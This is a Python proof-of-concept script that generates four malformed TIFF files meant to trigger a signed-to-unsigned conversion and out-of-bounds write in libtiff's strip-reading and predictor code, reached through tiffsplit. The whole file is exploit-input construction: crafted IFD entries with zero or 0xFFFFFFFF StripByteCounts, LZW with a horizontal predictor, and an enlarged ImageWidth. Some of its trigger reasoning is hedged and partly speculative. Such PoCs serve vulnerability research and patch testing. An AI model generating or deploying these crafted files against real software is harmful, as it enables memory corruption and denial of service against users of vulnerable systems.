#!/usr/bin/env python3
"""
PoC generator for VULN-001: Signed-to-unsigned conversion in _TIFFmemcpy/_TIFFmemset
CWE-195 -> CWE-787 (Out-of-bounds Write)

Trigger path: tiffsplit -> TIFFOpen -> TIFFClientOpen -> TIFFReadDirectory ->
  TIFFReadRawStrip -> TIFFRawStripSize returns (tsize_t)-1 for StripByteCount=0 ->
  decoding path fpAcc() in tif_predict.c -> _TIFFmalloc(cc) + _TIFFmemcpy(tmp, cp0, cc)
  where cc is negative tsize_t (wraps to huge size_t).

Key trigger: StripByteCounts=0 causes TIFFRawStripSize() to return (tsize_t)-1.
  When cast to size_t, this becomes SIZE_MAX, causing massive allocation/copy.
"""
import struct
import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def le16(v):
    return struct.pack('<H', v)

def le32(v):
    return struct.pack('<I', v)

def ifd_entry(tag, typ, count, value):
    """Pack a 12-byte IFD entry."""
    return struct.pack('<HHII', tag, typ, count, value)

SHORT = 3
LONG  = 4

def build_tiff_stripbytecounts_zero():
    """
    Strategy 1: StripByteCounts=0
    This makes TIFFRawStripSize() return (tsize_t)-1, which when passed to
    _TIFFmalloc and _TIFFmemcpy (via the LZW/predictor decode path) causes
    a signed-to-unsigned conversion leading to a massive allocation.
    """
    # IFD starts at offset 8 (right after header)
    ifd_offset = 8

    # IFD entries (must be sorted by tag number):
    # 0x0100 ImageWidth = 64
    # 0x0101 ImageLength = 64
    # 0x0102 BitsPerSample = 8
    # 0x0103 Compression = 5 (LZW)
    # 0x0106 PhotometricInterpretation = 1 (BlackIsZero)
    # 0x0111 StripOffsets -> points to strip data after IFD
    # 0x0115 SamplesPerPixel = 1
    # 0x0116 RowsPerStrip = 64
    # 0x0117 StripByteCounts = 0   <-- KEY: triggers TIFFRawStripSize returning -1
    # 0x013D Predictor = 2 (horizontal differencing, triggers fpAcc in tif_predict.c)

    num_entries = 10
    ifd_size = 2 + num_entries * 12 + 4  # count(2) + entries(N*12) + next_ifd(4)
    strip_data_offset = ifd_offset + ifd_size

    # Fake strip data - won't be valid LZW but triggers the allocation before decode
    strip_data = b'\x80\x00' * 32  # 64 bytes

    entries = []
    entries.append(ifd_entry(0x0100, SHORT, 1, 64))                     # ImageWidth
    entries.append(ifd_entry(0x0101, SHORT, 1, 64))                     # ImageLength
    entries.append(ifd_entry(0x0102, SHORT, 1, 8))                      # BitsPerSample
    entries.append(ifd_entry(0x0103, SHORT, 1, 5))                      # Compression=LZW
    entries.append(ifd_entry(0x0106, SHORT, 1, 1))                      # PhotometricInterp
    entries.append(ifd_entry(0x0111, LONG,  1, strip_data_offset))      # StripOffsets
    entries.append(ifd_entry(0x0115, SHORT, 1, 1))                      # SamplesPerPixel
    entries.append(ifd_entry(0x0116, SHORT, 1, 64))                     # RowsPerStrip
    entries.append(ifd_entry(0x0117, LONG,  1, 0))                      # StripByteCounts=0 KEY
    entries.append(ifd_entry(0x013D, SHORT, 1, 2))                      # Predictor=2

    assert len(entries) == num_entries

    ifd = le16(num_entries) + b''.join(entries) + le32(0)
    header = b'II' + le16(42) + le32(ifd_offset)
    return header + ifd + strip_data

def build_tiff_large_stripbytecounts():
    """
    Strategy 2: StripByteCounts=0xFFFFFFFF (> INT32_MAX)
    A very large StripByteCounts value causes TIFFRawStripSize to return
    a value that overflows when multiplied by SamplesPerPixel.
    """
    ifd_offset = 8
    num_entries = 10
    ifd_size = 2 + num_entries * 12 + 4
    strip_data_offset = ifd_offset + ifd_size
    strip_data = b'\x00' * 64

    entries = []
    entries.append(ifd_entry(0x0100, SHORT, 1, 64))
    entries.append(ifd_entry(0x0101, SHORT, 1, 64))
    entries.append(ifd_entry(0x0102, SHORT, 1, 8))
    entries.append(ifd_entry(0x0103, SHORT, 1, 5))                      # LZW
    entries.append(ifd_entry(0x0106, SHORT, 1, 1))
    entries.append(ifd_entry(0x0111, LONG,  1, strip_data_offset))
    entries.append(ifd_entry(0x0115, SHORT, 1, 1))
    entries.append(ifd_entry(0x0116, SHORT, 1, 64))
    entries.append(ifd_entry(0x0117, LONG,  1, 0xFFFFFFFF))             # Very large
    entries.append(ifd_entry(0x013D, SHORT, 1, 2))

    assert len(entries) == num_entries

    ifd = le16(num_entries) + b''.join(entries) + le32(0)
    header = b'II' + le16(42) + le32(ifd_offset)
    return header + ifd + strip_data

def build_tiff_no_compression_zero_bytecounts():
    """
    Strategy 3: No compression (Compression=1), StripByteCounts=0
    Tests the alternate path without LZW decode.
    """
    ifd_offset = 8
    num_entries = 9  # No Predictor tag
    ifd_size = 2 + num_entries * 12 + 4
    strip_data_offset = ifd_offset + ifd_size
    strip_data = b'\x00' * 64

    entries = []
    entries.append(ifd_entry(0x0100, SHORT, 1, 64))
    entries.append(ifd_entry(0x0101, SHORT, 1, 64))
    entries.append(ifd_entry(0x0102, SHORT, 1, 8))
    entries.append(ifd_entry(0x0103, SHORT, 1, 1))                      # No compression
    entries.append(ifd_entry(0x0106, SHORT, 1, 1))
    entries.append(ifd_entry(0x0111, LONG,  1, strip_data_offset))
    entries.append(ifd_entry(0x0115, SHORT, 1, 1))
    entries.append(ifd_entry(0x0116, SHORT, 1, 64))
    entries.append(ifd_entry(0x0117, LONG,  1, 0))                      # StripByteCounts=0

    assert len(entries) == num_entries

    ifd = le16(num_entries) + b''.join(entries) + le32(0)
    header = b'II' + le16(42) + le32(ifd_offset)
    return header + ifd + strip_data

def build_tiff_large_imagewidth():
    """
    Strategy 4: Large ImageWidth to trigger bufsize overflow in tif_getimage.c
    bufsize = width * height * samplesPerPixel; if this overflows, _TIFFmemset
    gets a bad size value.
    """
    ifd_offset = 8
    num_entries = 9
    ifd_size = 2 + num_entries * 12 + 4
    strip_data_offset = ifd_offset + ifd_size
    strip_data = b'\x00' * 64

    # Large width that could cause integer overflow in bufsize calculation
    large_width = 0x7FFF  # 32767, safely large without immediate rejection

    entries = []
    entries.append(ifd_entry(0x0100, LONG,  1, large_width))            # ImageWidth large
    entries.append(ifd_entry(0x0101, SHORT, 1, 64))
    entries.append(ifd_entry(0x0102, SHORT, 1, 8))
    entries.append(ifd_entry(0x0103, SHORT, 1, 1))                      # No compression
    entries.append(ifd_entry(0x0106, SHORT, 1, 1))
    entries.append(ifd_entry(0x0111, LONG,  1, strip_data_offset))
    entries.append(ifd_entry(0x0115, SHORT, 1, 1))
    entries.append(ifd_entry(0x0116, SHORT, 1, 64))
    entries.append(ifd_entry(0x0117, LONG,  1, 0))                      # StripByteCounts=0

    assert len(entries) == num_entries

    ifd = le16(num_entries) + b''.join(entries) + le32(0)
    header = b'II' + le16(42) + le32(ifd_offset)
    return header + ifd + strip_data

def main():
    variants = [
        ("vuln_001.tif",        build_tiff_stripbytecounts_zero,          "Strategy 1: LZW+Predictor, StripByteCounts=0"),
        ("vuln_001_v2.tif",     build_tiff_large_stripbytecounts,         "Strategy 2: LZW+Predictor, StripByteCounts=0xFFFFFFFF"),
        ("vuln_001_v3.tif",     build_tiff_no_compression_zero_bytecounts,"Strategy 3: No compression, StripByteCounts=0"),
        ("vuln_001_v4.tif",     build_tiff_large_imagewidth,              "Strategy 4: Large ImageWidth, StripByteCounts=0"),
    ]

    for filename, builder, description in variants:
        out_path = os.path.join(SCRIPT_DIR, filename)
        data = builder()
        with open(out_path, 'wb') as f:
            f.write(data)
        print(f"[+] {filename}: {len(data)} bytes — {description}")

    print("\n[*] All TIFF variants written.")
    print(f"[*] Output directory: {SCRIPT_DIR}")

if __name__ == '__main__':
    main()
